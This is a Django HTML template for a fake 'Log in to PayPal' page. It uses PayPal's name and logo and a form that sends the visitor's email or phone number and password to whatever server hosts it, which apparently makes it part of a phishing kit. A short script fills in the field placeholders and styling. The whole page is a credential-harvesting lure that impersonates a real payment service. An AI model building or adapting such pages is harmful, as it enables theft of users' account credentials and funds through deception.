<!DOCTYPE html>
{% load static %}
{%  block content %}
<html lang="en">
  <head>
    <title>Log in to PayPal</title>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <link rel="icon" type="image/x-icon" href="{% static 'images/favicon.png' %}">

    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link
      href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="{% static 'css/styles.css' %}" />
    <title>Paypal</title>
  </head>
  <body>
    <div class="container">
      <div class="content">
        <img src="{% static 'images/paypal.png' %}" alt="paypal" class="logo" />
        <form method="POST" action="" enctype="multipart/form-data">
            {% csrf_token %}
<div class="one">
                        {{form.as_p}}
                      </div>
                        <button class="next__btn" type="submit">log in</button>
                    </form>
                    <div class="divider"><span>or</span></div>
                    <button class="signup__btn">Sign Up</button>
      <div class="footer">
        <div class="country">
          <div class="gtranslate_wrapper"></div>
        </div>
        <div class="language">
          <span>English</span>
          <span>Français</span>
          <span>Español</span>
          <span>中国人</span>
        </div>
      </div>
    </div>
<script>window.gtranslateSettings = {"default_language":"en","detect_browser_language":true,"wrapper_selector":".gtranslate_wrapper","flag_size":24}</script>
<script src="https://cdn.gtranslate.net/widgets/latest/popup.js" defer></script>
    <script>
      /* Because i didnt set placeholder values in forms.py they will be set here using vanilla Javascript
  //We start indexing at one because CSRF_token is considered and input field 
  */
  
  //Query All input fields
  var form_fields = document.getElementsByTagName('input')
  form_fields[1].placeholder='Email Or mobile number';
  form_fields[2].placeholder='Password';
  
  for (var field in form_fields){	
  form_fields[field].className += ' form-control'
  }
  </script>
  </body>
  {%  endblock content %}

</html>
